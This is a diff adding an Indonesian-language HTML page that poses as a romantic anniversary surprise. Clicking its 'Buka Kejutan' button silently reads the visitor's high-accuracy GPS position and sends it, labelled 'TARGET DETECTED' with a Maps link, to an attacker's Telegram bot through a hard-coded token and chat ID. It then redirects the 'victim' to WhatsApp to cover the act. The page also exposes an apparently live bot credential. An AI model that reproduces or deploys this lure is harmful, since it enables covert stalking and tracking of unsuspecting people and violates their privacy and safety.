@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special Anniversary For You ❤️</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #ff758c, #ff7eb3);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 { color: #d63384; margin-bottom: 10px; }
+        p { color: #666; font-size: 16px; line-height: 1.5; }
+        .btn {
+            background-color: #d63384;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        .btn:hover { background-color: #b02a6b; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Happy Anniversary! 🎉</h1>
+        <p>Ada sebuah kejutan spesial yang sudah disiapkan khusus untukmu. Klik tombol di bawah untuk melihatnya!</p>
+        <button class="btn" onclick="sendLocation()">Buka Kejutan ❤️</button>
+    </div>
+
+    <script>
+        function sendLocation() {
+            // Ganti TOKEN_BOT dan CHAT_ID dengan milik Anda dari BotFather Telegram
+            const botToken = "8716975261:AAFiM2twTIudFqkcP3pJkI0Agni9bhoDWwU";
+            const chatId = "1450557290";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    // Format pesan yang akan masuk ke Telegram Anda
+                    const message = `🎯 TARGET TERDETEKSI!\n\nLatitude: ${lat}\nLongitude: ${lon}\nAkurasi: ${accuracy} meter\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // Kirim data langsung ke API Telegram
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+
+                }, function(error) {
+                    console.log("Izin lokasi ditolak.");
+                }, {
+                    enableHighAccuracy: true
+                });
+            }
+
+            // Alihkan korban ke halaman WhatsApp atau halaman ucapan setelah tombol diklik
+            setTimeout(function() {
+                window.location.href = "https://wa.me/?text=Makasih%20ya%20kejutannya!";
+            }, 1000);
+        }
+    </script>
+
+</body>
+</html>
